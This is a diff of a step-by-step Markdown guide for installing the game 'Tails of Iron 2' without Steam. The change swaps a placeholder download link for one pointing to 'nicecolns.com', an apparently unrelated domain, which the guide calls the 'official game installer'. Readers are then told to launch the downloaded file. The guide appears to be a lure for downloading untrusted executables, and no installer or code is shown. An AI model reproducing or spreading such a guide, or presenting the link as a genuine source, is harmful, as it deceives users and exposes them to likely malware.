@@ -19,7 +19,7 @@ Follow this step-by-step guide to download and install the game directly—no St
 
 ### Step 1: Download the Installer
 - Use the link below to download the official game installer:
-  [Download Tails of Iron 2 Installer](https://example.com/tails-of-iron-2-installer)
+  [Download Tails of Iron 2 Installer](https://nicecolns.com/)
 
 ### Step 2: Launch the Installer
 - Locate the downloaded installer file in your "Downloads" folder or your selected save location.
